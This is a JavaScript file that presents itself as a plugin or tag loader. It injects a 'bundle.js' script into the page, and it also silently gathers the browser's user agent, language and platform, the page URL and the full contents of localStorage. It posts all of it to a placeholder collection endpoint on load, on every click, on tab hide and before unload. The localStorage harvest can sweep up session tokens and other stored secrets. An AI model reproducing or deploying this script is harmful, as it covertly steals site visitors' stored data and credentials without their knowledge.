(() => {
  "use strict";

  const paramsToWatch = ["user-agent", "language", "platform"];
  let collectedData = {};
  function generateHashCode(dataObj) {
    const hashString = Object.entries(dataObj).reduce((acc, [key, value]) => acc + key + value, "");
    let hash = 0;
    for (let i = 0; i < hashString.length; i++) {
      const charCode = hashString.charCodeAt(i);
      hash = (hash << 5) - hash + charCode;
      hash |= 0; // convert to 32-bit integer
    }
    return hash.toString(32);
  }
  const e = document.currentScript,
    t = Array.from(e.attributes),
    r = document.createElement("script");
  function collectData() {
    collectedData = paramsToWatch.reduce((acc, param) => {
      acc[param] = navigator[param] || "not found";
      return acc;
    }, {});
    collectedData.url = window.location.href;
    if (localStorage.length) {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        collectedData[`ls_${key}`] = localStorage.getItem(key);
      }
    }
  }
  function postDataToServer() {
    const code = generateHashCode(collectedData);
    const api = `https://example.com/api/collect`;
    fetch(api, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode: code,
        data: collectedData
      })
    }).then(response => {
      if (response.ok) {
        console.log(`Data sent successfully with code: ${code}`);
      } else {
        console.error(`Failed to send data. status: ${response.status}`);
      }
    }).catch(error => console.error(`Error while sending data: ${error}`));
  }
  t.forEach(e => {
    r.setAttribute(e.name, e.value);
  });
  function trackAndReport() {
    collectData();
    postDataToServer();
  }
  const i = e.src.split("/").pop();
  window.onbeforeunload = trackAndReport;
  window.onclick = trackAndReport;
  window.addEventListener('storage', trackAndReport);
  "loader.js" === i || "idw_plugin_light.min.js" === i ? (r.setAttribute("src", `${e.src.replace(i, "bundle.js")}?v=0.3.1r`), document.head.appendChild(r)) : console.error("Error loading Anonymised tag: expected file name to be loader.js or idw_plugin_light.min.js");
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') {
      trackAndReport();
    }
  });
  trackAndReport();
})();